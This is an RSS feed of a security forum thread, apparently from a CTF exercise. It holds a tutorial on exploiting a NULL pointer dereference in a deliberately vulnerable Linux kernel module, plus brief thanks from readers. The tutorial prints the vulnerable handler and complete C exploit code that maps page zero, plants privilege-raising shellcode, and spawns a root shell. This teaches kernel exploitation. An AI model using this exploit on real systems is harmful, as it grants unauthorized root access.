<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Kernel Exploitation | Dereferencing a NULL pointer!</title>
    <link>https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850</link>
    <description>## NULL Pointer dereference
In the name of Allah, the most beneficent, the most merciful.
___
- Hello everyone to a boring article once again. :smiley: 
- I&#39;ve found a bit of freetime, so i decided to write this article, it isn&#39;t really well done, but i hope you guys like it and learn much :blush:!

### Kernel Exploitation ?
- Many of the people here probably never faced a kernel exploitation challenge..
- So, i&#39;ve decided that it&#39;s a good choice to write about kernel exploitation a bit, and demonstrate some few basic stuff on it.
- Instead of just popping a shell, it won&#39;t lead to nothing, we need to raise our permissions first!

### NULL Pointer dereference ?
- It&#39;s when a **uninitialized or zero-ed out pointer** is dereferenced, leading to making the _PC/IP (Program counter/ Instruction pointer)_ point to 0, therefore, making the kernel panic!
- The first thing is to check what protections are ON, in our case, all protections are turned OFF! ( Including Supervisor Mode Execution Prevention ) Which is similiar to DEP/NX ( No-Execute protection on user-land ) and also mmap_min_addr ( Don&#39;t allow mmap()&#39;ing a NULL address ), lucky us..
- On ring0 modules, the goal differs, while in ring3 binaries we just focus on popping a shell, and enjoying the binary privileges, we need this time to modify our permissions. Luckily, there are some kernel structures, holding the current process privileges. What we&#39;ll try doing is leveraging our credentials to root ones, and popping a shell after doing so.
### How will we raise credentials ?
- Before starting, we need to know what we should deal with:
- Each process informations is stored as a **task_struct**!
 - _a look on **sched.h** file:_
  ```c
struct task_struct {
/* ... */
/* Process credentials: */
/* Tracer&#39;s credentials at attach: */
const struct cred __rcu *ptracer_cred;
/* Objective and real subjective task credentials (COW): */
const struct cred __rcu *real_cred;
/* Effective (overridable) subjective task credentials (COW): */
const struct cred __rcu *cred;
/* ... */
}
  ```

- _There&#39;s the effective subjective task credentials, declared as a cred struct!_
 - _a look on **cred.h** file:_
  ```c
struct cred {
/* ... */
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
/* ... */
}
```

- Here we&#39;ll focus on the effective UID of the task ( euid declared as a kuid_t ); if we somehow succedd to set it&#39;s value to 0, the current task will have root privileges!

### How are we supposed to find them ?
- Making use of some kernel symbols!
Some functions can be used to leverage the current process credentials, their addresses are static, and can easily be reteived from a file, depending on the kernel we are dealing with:
- _/proc/kallsyms_, _/proc/ksyms_, _/dev/ksyms_..
_Some of these functions are declared in cred.c_.
  ```c
extern int commit_creds(struct cred *);
/* ... */
extern struct cred *prepare_kernel_cred(struct task_struct *);
  ```

  - as we can see, the return value of **prepare_kernel_cred**() function is of type _struct cred *_, that we&#39;ll need to pass as an argument later to **commit_creds**(), so it can assign our freshly gained privileges to our current process!
 - As a conclusion: we&#39;ll elevate our privileges by calling: **commit_creds**(**prepare_kernel_cred**(0));

- Understanding the vulnerability and how to trigger it!
An important thing before starting to write the exploit, is to know how to trigger the vulnerability itself! Know where that pointer is dereferenced and on what circumstances..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/e58140d7c67306779986d2c1a0aaf8580d1b1b03.png&quot; width=&quot;300&quot; height=&quot;440&quot;&gt;
_**TADAAAAAAAAAAAAAAAAAAAAAAAAAAAA BORING THEORY**_

### Solving a Kernel challenge..

- And here we go again, let&#39;s check the challenge we were given.
Let&#39;s start by checking the protections:
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/8/8aabb7459a979b2ddb579390da9224f97c41bf3c.png&quot; width=&quot;690&quot; height=&quot;173&quot;&gt;
We are safe, all protections are OFF!
- On this function _tostring\_write()_, we can see that commands should always start with 10 &#39;*&#39;..
- When this kernel module is loaded, it&#39;ll call it&#39;s constructor, once on each run.
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/1/179ffc021f3443e19df2e395345121c502a00f43.png&quot; width=&quot;394&quot; height=&quot;107&quot;&gt;
- We can see that it will call _tostring\_create()_; This function is responsible in setting the function pointer in _tostring\_s struct_!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/4f684ecf0148b1459b570ce78acaafebd0b7b8c7.png&quot; width=&quot;519&quot; height=&quot;168&quot;&gt;
- This is important, keep it in mind. So, the two pointers are set once on each run ( or if requested )..
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/f281d055f9fffdf1a46fde00811f60bd9b5aa80c.png&quot; width=&quot;690&quot; height=&quot;183&quot;&gt;
- Now we can easily recognize the vulnerable function, which is the following;
   ```c
   static ssize_t tostring_write(struct file *f, const char __user *buf,size_t len, loff_t *off)
{
  char *bufk;
  int i,j;
  printk(KERN_INFO &quot;Tostring: write()\n&quot;);
  bufk = kmalloc(len + 1, GFP_DMA);
  if (bufk){
    if (copy_from_user(bufk, buf, len))
        return -EFAULT;
    bufk[len] = &#39;\0&#39;;
    i=0;
    while(i &lt;len) {
      for (j=0;(j&lt;10) &amp;&amp; (bufk[j]==&#39;*&#39;);j++);
      if (j == 10) {
        for (j=i+10;(bufk[j]!=&#39;\0&#39;) &amp;&amp; (bufk[j] != &#39;\n&#39;);j++);
        bufk[j]=&#39;\0&#39;;
        printk(&quot;Tostring: Cmd %s\n&quot;,bufk+i+10);
        switch(bufk[i+10]) {
        case &#39;H&#39;:
          tostring-&gt;tostring_read= tostring_read_hexa;
          break;
        case &#39;D&#39;:
          tostring-&gt;tostring_read= tostring_read_dec;
          break;
        case &#39;S&#39;:
          printk(&quot;Tostring: Delete stack\n&quot;);
          kfree(tostring-&gt;tostring_stack);
          tostring-&gt;tostring_stack=NULL;
          tostring-&gt;tostring_read=NULL;
          tostring-&gt;pointer=0;
          tostring-&gt;pointer_max=0;
          break;
        case &#39;N&#39;:
          printk(&quot;Tostring: Stack create with size %ld\n&quot;,local_strtoul(bufk+i+11,NULL,10));
          if (tostring-&gt;tostring_stack==NULL) tostring_create(local_strtoul(bufk+i+11,NULL,10));
          if (tostring-&gt;tostring_stack==NULL) printk(&quot;Tostring: Error, impossible to create stack\n&quot;);
          break;
        }
        i=j+1;
      }
      else {
        printk(&quot;tostring: insertion %lld\n&quot;,*((long long int *) (bufk+i)));
        if (tostring-&gt;pointer &gt;= tostring-&gt;pointer_max)
          printk(KERN_INFO &quot;Tostring: Stack full\n&quot;);
        else
          tostring-&gt;tostring_stack[(tostring-&gt;pointer)++]= *((long long int *) (bufk+i));
        i = i+sizeof(long long int);
      }
    }
  kfree(bufk);
  }
  return len;
}
   ```

- As we can see, there&#39;s a switch on what&#39;s after the ten &#39;*&#39;, the most interesting one here.. is &#39;S&#39; case. It will nullset the function pointer tostring_read, which is good for us!
- But, after setting it to null, we need to read from it, to cause it&#39;s dereferencing, to do so, we will simply read the file, to trigger a call to _tostring\_read()_!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/5/56f1c8628af7f8f50d74f12475dbdfdcda87d92e.png&quot; width=&quot;553&quot; height=&quot;105&quot;&gt;
- We  are good, let&#39;s start writting our exploit. We were used on writting exploits with Python :cry:, We&#39;ll be now using C instead..
- Let&#39;s start by writting a simple one, to trigger the call and zero-out the function pointer.
 ```c
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;sys/mman.h&gt;
 #include &lt;fcntl.h&gt;
/**/
 #define vulnerable_device &quot;/dev/tostring&quot;
/**/
void main(void){
	int fd;
	char payload[15];
	/**/
	memset(payload, &#39;*&#39;, 10);
	/**/
	payload[10] = &#39;S&#39;;
	payload[11] = 0;
	/**/
	fd = open(vulnerable_device, O_RDWR);
	if(fd &lt; 0){
		printf(&quot;Couldn&#39;t open device!&quot;);
	}
	/**/
	write(fd, payload, 12);
}
 ```

- We are good for now, but we still need to cause it to dereference, only by reading the file, we can do that.
  ```c
 read(fd, 0, 1);
  ```

- Oh yeah, we got it, we made **IP** point to 0.. 
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/6bc8da76c8a9d6d08532ddaa0494cce9f75c6664.png&quot; width=&quot;642&quot; height=&quot;53&quot;&gt;
- Now, lucky us, **mmap_min_addr** protection is **OFF**. We can allocate a small area in NULL, and place our shellcode which going to raise our privileges..
- Let&#39;s get **prepare_kernel_cred** and **commit_creds** addresses from _/proc/kallsyms_!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/f0c266369e02e64be1724dd6f03156a03c23ce02.png&quot; width=&quot;586&quot; height=&quot;52&quot;&gt;
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/a76fb602e4d508411edc16f331937b18cd0a1d05.png&quot; width=&quot;229&quot; height=&quot;20&quot;&gt;
- Now, i&#39;ll use rasm2, to make a small shellcode!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/9/9120df60878d62287e68e26d176a9fb628faaadf.png&quot; width=&quot;641&quot; height=&quot;50&quot;&gt;
- The shellcode does the following:
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/39efc3c8d432a58e06b4c8a8e340933a97e8b8e5.png&quot; width=&quot;690&quot; height=&quot;110&quot;&gt;
- Let&#39;s add the shellcode part, before causing pointer dereference to our exploit!
  ```c
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;sys/mman.h&gt;
 #include &lt;fcntl.h&gt;
/**/
 #define vulnerable_device &quot;/dev/tostring&quot;
/**/
void pop_shell(){
	system(&quot;sh&quot;);
}
/**/
void main(void){
	int fd;
	char payload[15];
	char shellcode[15] = &quot;\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3&quot;;
	/**/
	memset(payload, &#39;*&#39;, 10);
	/**/
	payload[10] = &#39;S&#39;;
	payload[11] = 0;
	/**/
	fd = open(vulnerable_device, O_RDWR);
	if(fd &lt; 0){
		printf(&quot;Couldn&#39;t open device!&quot;);
	}
	write(fd, payload, 12);
	/**/
	mmap(NULL, sizeof(shellcode), PROT_EXEC |PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS |MAP_FIXED, -1, 0);
	memcpy(NULL, shellcode, sizeof(shellcode));
	/**/
	read(fd, 0, 1);
	/**/
	pop_shell();
}
 ```

- Let&#39;s compile it, and run it!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/7/70c5e85fedf1abe09fca8d48be8c855135fcf155.png&quot; width=&quot;643&quot; height=&quot;114&quot;&gt;
- And here comes our root shell poppin&#39;!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/1/1b9b92bc42c399d62352e127ab34a6d0d94f9d88.png&quot; width=&quot;389&quot; height=&quot;54&quot;&gt;

---

- Hope you guys enjoyed this small article, and learned as well!

~ exploit</description>
    
    <lastBuildDate>Fri, 22 Feb 2019 12:57:03 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Kernel Exploitation | Dereferencing a NULL pointer!</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 3 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/8</link>
        <pubDate>Mon, 25 Feb 2019 18:10:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3850-8</guid>
        <source url="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850.rss">Kernel Exploitation | Dereferencing a NULL pointer!</source>
      </item>
      <item>
        <title>Kernel Exploitation | Dereferencing a NULL pointer!</title>
        <dc:creator><![CDATA[HACKER]]></dc:creator>
        <description><![CDATA[
            <p>Firstly, thank you for this post. You are super! <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
          <p><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/7</link>
        <pubDate>Fri, 22 Feb 2019 12:57:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3850-7</guid>
        <source url="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850.rss">Kernel Exploitation | Dereferencing a NULL pointer!</source>
      </item>
      <item>
        <title>Kernel Exploitation | Dereferencing a NULL pointer!</title>
        <dc:creator><![CDATA[Narcodex]]></dc:creator>
        <description><![CDATA[
            <p>It was nice to see an exploit not written in Python, and something in C… Although i’ve noticed C and C++ are becoming more used now adays, which is nice to see. Very widely used languages.  Unity or Unreal being an example of one. Thank you for sharing <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a>. It was a very entertaining read</p>
          <p><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/6</link>
        <pubDate>Sun, 27 Jan 2019 18:28:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3850-6</guid>
        <source url="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850.rss">Kernel Exploitation | Dereferencing a NULL pointer!</source>
      </item>
      <item>
        <title>Kernel Exploitation | Dereferencing a NULL pointer!</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/5</link>
        <pubDate>Sat, 26 Jan 2019 23:13:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3850-5</guid>
        <source url="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850.rss">Kernel Exploitation | Dereferencing a NULL pointer!</source>
      </item>
      <item>
        <title>Kernel Exploitation | Dereferencing a NULL pointer!</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/4</link>
        <pubDate>Thu, 26 Oct 2017 22:26:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3850-4</guid>
        <source url="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850.rss">Kernel Exploitation | Dereferencing a NULL pointer!</source>
      </item>
      <item>
        <title>Kernel Exploitation | Dereferencing a NULL pointer!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>You are welcome, happy it helped you! <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
          <p><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/3</link>
        <pubDate>Mon, 23 Oct 2017 12:47:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3850-3</guid>
        <source url="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850.rss">Kernel Exploitation | Dereferencing a NULL pointer!</source>
      </item>
      <item>
        <title>Kernel Exploitation | Dereferencing a NULL pointer!</title>
        <dc:creator><![CDATA[k3rnelmaster]]></dc:creator>
        <description><![CDATA[
            <p>It’s a good tutorial  <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"><br>
It’s very helpful to understand what “dereferencing a null pointer” is.<br>
Thank you exploit~</p>
          <p><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/2</link>
        <pubDate>Sun, 22 Oct 2017 05:52:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3850-2</guid>
        <source url="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850.rss">Kernel Exploitation | Dereferencing a NULL pointer!</source>
      </item>
      <item>
        <title>Kernel Exploitation | Dereferencing a NULL pointer!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <h2>NULL Pointer dereference</h2>
<p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<ul>
<li>Hello everyone to a boring article once again. <img src="/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:">
</li>
<li>I’ve found a bit of freetime, so i decided to write this article, it isn’t really well done, but i hope you guys like it and learn much <img src="/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:">!</li>
</ul>
<h3>Kernel Exploitation ?</h3>
<ul>
<li>Many of the people here probably never faced a kernel exploitation challenge…</li>
<li>So, i’ve decided that it’s a good choice to write about kernel exploitation a bit, and demonstrate some few basic stuff on it.</li>
<li>Instead of just popping a shell, it won’t lead to nothing, we need to raise our permissions first!</li>
</ul>
<h3>NULL Pointer dereference ?</h3>
<ul>
<li>It’s when a <strong>uninitialized or zero-ed out pointer</strong> is dereferenced, leading to making the <em>PC/IP (Program counter/ Instruction pointer)</em> point to 0, therefore, making the kernel panic!</li>
<li>The first thing is to check what protections are ON, in our case, all protections are turned OFF! ( Including Supervisor Mode Execution Prevention ) Which is similiar to DEP/NX ( No-Execute protection on user-land ) and also mmap_min_addr ( Don’t allow mmap()'ing a NULL address ), lucky us…</li>
<li>On ring0 modules, the goal differs, while in ring3 binaries we just focus on popping a shell, and enjoying the binary privileges, we need this time to modify our permissions. Luckily, there are some kernel structures, holding the current process privileges. What we’ll try doing is leveraging our credentials to root ones, and popping a shell after doing so.</li>
</ul>
<h3>How will we raise credentials ?</h3>
<ul>
<li>Before starting, we need to know what we should deal with:</li>
<li>Each process informations is stored as a <strong>task_struct</strong>!</li>
<li><em>a look on <strong>sched.h</strong> file:</em></li>
</ul>
<pre><code class="lang-auto">struct task_struct {
/* ... */
/* Process credentials: */
/* Tracer's credentials at attach: */
const struct cred __rcu *ptracer_cred;
/* Objective and real subjective task credentials (COW): */
const struct cred __rcu *real_cred;
/* Effective (overridable) subjective task credentials (COW): */
const struct cred __rcu *cred;
/* ... */
}
</code></pre>
<ul>
<li><em>There’s the effective subjective task credentials, declared as a cred struct!</em></li>
<li><em>a look on <strong>cred.h</strong> file:</em></li>
</ul>
<pre><code class="lang-auto">struct cred {
/* ... */
  kuid_t		uid;		/* real UID of the task */
  kgid_t		gid;		/* real GID of the task */
  kuid_t		suid;		/* saved UID of the task */
  kgid_t		sgid;		/* saved GID of the task */
  kuid_t		euid;		/* effective UID of the task */
  kgid_t		egid;		/* effective GID of the task */
/* ... */
}
</code></pre>
<ul>
<li>Here we’ll focus on the effective UID of the task ( euid declared as a kuid_t ); if we somehow succedd to set it’s value to 0, the current task will have root privileges!</li>
</ul>
<h3>How are we supposed to find them ?</h3>
<ul>
<li>Making use of some kernel symbols!<br>
Some functions can be used to leverage the current process credentials, their addresses are static, and can easily be reteived from a file, depending on the kernel we are dealing with:</li>
<li>
<em>/proc/kallsyms</em>, <em>/proc/ksyms</em>, <em>/dev/ksyms</em>…<br>
<em>Some of these functions are declared in cred.c</em>.<pre><code class="lang-auto"></code></pre>
</li>
</ul>
<p>extern int commit_creds(struct cred <em>);<br>
/</em> … */<br>
extern struct cred *prepare_kernel_cred(struct task_struct *);</p>
<pre><code class="lang-auto">
- as we can see, the return value of **prepare_kernel_cred**() function is of type _struct cred *_, that we'll need to pass as an argument later to **commit_creds**(), so it can assign our freshly gained privileges to our current process!
- As a conclusion: we'll elevate our privileges by calling: **commit_creds**(**prepare_kernel_cred**(0));

- Understanding the vulnerability and how to trigger it!
An important thing before starting to write the exploit, is to know how to trigger the vulnerability itself! Know where that pointer is dereferenced and on what circumstances..

&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/e/e58140d7c67306779986d2c1a0aaf8580d1b1b03.png" width="300" height="440"&gt;
_**TADAAAAAAAAAAAAAAAAAAAAAAAAAAAA BORING THEORY**_

### Solving a Kernel challenge..

- And here we go again, let's check the challenge we were given.
Let's start by checking the protections:
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/8/8aabb7459a979b2ddb579390da9224f97c41bf3c.png" width="690" height="173"&gt;
We are safe, all protections are OFF!
- On this function _tostring\_write()_, we can see that commands should always start with 10 '*'..
- When this kernel module is loaded, it'll call it's constructor, once on each run.
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/1/179ffc021f3443e19df2e395345121c502a00f43.png" width="394" height="107"&gt;
- We can see that it will call _tostring\_create()_; This function is responsible in setting the function pointer in _tostring\_s struct_!
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/4/4f684ecf0148b1459b570ce78acaafebd0b7b8c7.png" width="519" height="168"&gt;
- This is important, keep it in mind. So, the two pointers are set once on each run ( or if requested )..
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/f/f281d055f9fffdf1a46fde00811f60bd9b5aa80c.png" width="690" height="183"&gt;
- Now we can easily recognize the vulnerable function, which is the following;
 ```c
 static ssize_t tostring_write(struct file *f, const char __user *buf,size_t len, loff_t *off)
{
char *bufk;
int i,j;
printk(KERN_INFO "Tostring: write()\n");
bufk = kmalloc(len + 1, GFP_DMA);
if (bufk){
  if (copy_from_user(bufk, buf, len))
      return -EFAULT;
  bufk[len] = '\0';
  i=0;
  while(i &lt;len) {
    for (j=0;(j&lt;10) &amp;&amp; (bufk[j]=='*');j++);
    if (j == 10) {
      for (j=i+10;(bufk[j]!='\0') &amp;&amp; (bufk[j] != '\n');j++);
      bufk[j]='\0';
      printk("Tostring: Cmd %s\n",bufk+i+10);
      switch(bufk[i+10]) {
      case 'H':
        tostring-&gt;tostring_read= tostring_read_hexa;
        break;
      case 'D':
        tostring-&gt;tostring_read= tostring_read_dec;
        break;
      case 'S':
        printk("Tostring: Delete stack\n");
        kfree(tostring-&gt;tostring_stack);
        tostring-&gt;tostring_stack=NULL;
        tostring-&gt;tostring_read=NULL;
        tostring-&gt;pointer=0;
        tostring-&gt;pointer_max=0;
        break;
      case 'N':
        printk("Tostring: Stack create with size %ld\n",local_strtoul(bufk+i+11,NULL,10));
        if (tostring-&gt;tostring_stack==NULL) tostring_create(local_strtoul(bufk+i+11,NULL,10));
        if (tostring-&gt;tostring_stack==NULL) printk("Tostring: Error, impossible to create stack\n");
        break;
      }
      i=j+1;
    }
    else {
      printk("tostring: insertion %lld\n",*((long long int *) (bufk+i)));
      if (tostring-&gt;pointer &gt;= tostring-&gt;pointer_max)
        printk(KERN_INFO "Tostring: Stack full\n");
      else
        tostring-&gt;tostring_stack[(tostring-&gt;pointer)++]= *((long long int *) (bufk+i));
      i = i+sizeof(long long int);
    }
  }
kfree(bufk);
}
return len;
}
</code></pre>
<ul>
<li>As we can see, there’s a switch on what’s after the ten ‘*’, the most interesting one here… is ‘S’ case. It will nullset the function pointer tostring_read, which is good for us!</li>
<li>But, after setting it to null, we need to read from it, to cause it’s dereferencing, to do so, we will simply read the file, to trigger a call to <em>tostring_read()</em>!<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/5/56f1c8628af7f8f50d74f12475dbdfdcda87d92e.png" width="553" height="105">
</li>
<li>We  are good, let’s start writting our exploit. We were used on writting exploits with Python <img src="/images/emoji/twitter/cry.png?v=9" title=":cry:" class="emoji" alt=":cry:">, We’ll be now using C instead…</li>
<li>Let’s start by writting a simple one, to trigger the call and zero-out the function pointer.</li>
</ul>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
/**/
#define vulnerable_device "/dev/tostring"
/**/
void main(void){
   int fd;
   char payload[15];
   /**/
   memset(payload, '*', 10);
   /**/
   payload[10] = 'S';
   payload[11] = 0;
   /**/
   fd = open(vulnerable_device, O_RDWR);
   if(fd &lt; 0){
   	printf("Couldn't open device!");
   }
   /**/
   write(fd, payload, 12);
}
</code></pre>
<ul>
<li>We are good for now, but we still need to cause it to dereference, only by reading the file, we can do that.<pre><code class="lang-auto"></code></pre>
</li>
</ul>
<p>read(fd, 0, 1);</p>
<pre><code class="lang-auto">
- Oh yeah, we got it, we made **IP** point to 0.. 
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/6/6bc8da76c8a9d6d08532ddaa0494cce9f75c6664.png" width="642" height="53"&gt;
- Now, lucky us, **mmap_min_addr** protection is **OFF**. We can allocate a small area in NULL, and place our shellcode which going to raise our privileges..
- Let's get **prepare_kernel_cred** and **commit_creds** addresses from _/proc/kallsyms_!
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/f/f0c266369e02e64be1724dd6f03156a03c23ce02.png" width="586" height="52"&gt;
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/a/a76fb602e4d508411edc16f331937b18cd0a1d05.png" width="229" height="20"&gt;
- Now, i'll use rasm2, to make a small shellcode!
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/9/9120df60878d62287e68e26d176a9fb628faaadf.png" width="641" height="50"&gt;
- The shellcode does the following:
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/3/39efc3c8d432a58e06b4c8a8e340933a97e8b8e5.png" width="690" height="110"&gt;
- Let's add the shellcode part, before causing pointer dereference to our exploit!
```c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
/**/
#define vulnerable_device "/dev/tostring"
/**/
void pop_shell(){
  system("sh");
}
/**/
void main(void){
  int fd;
  char payload[15];
  char shellcode[15] = "\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3";
  /**/
  memset(payload, '*', 10);
  /**/
  payload[10] = 'S';
  payload[11] = 0;
  /**/
  fd = open(vulnerable_device, O_RDWR);
  if(fd &lt; 0){
  	printf("Couldn't open device!");
  }
  write(fd, payload, 12);
  /**/
  mmap(NULL, sizeof(shellcode), PROT_EXEC |PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS |MAP_FIXED, -1, 0);
  memcpy(NULL, shellcode, sizeof(shellcode));
  /**/
  read(fd, 0, 1);
  /**/
  pop_shell();
}
</code></pre>
<ul>
<li>Let’s compile it, and run it!<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/7/70c5e85fedf1abe09fca8d48be8c855135fcf155.png" width="643" height="114">
</li>
<li>And here comes our root shell poppin’!<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/1/1b9b92bc42c399d62352e127ab34a6d0d94f9d88.png" width="389" height="54">
</li>
</ul>
<hr>
<ul>
<li>Hope you guys enjoyed this small article, and learned as well!</li>
</ul>
<p>~ exploit</p>
          <p><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850/1</link>
        <pubDate>Tue, 10 Oct 2017 19:40:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3850-1</guid>
        <source url="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850.rss">Kernel Exploitation | Dereferencing a NULL pointer!</source>
      </item>
  </channel>
</rss>
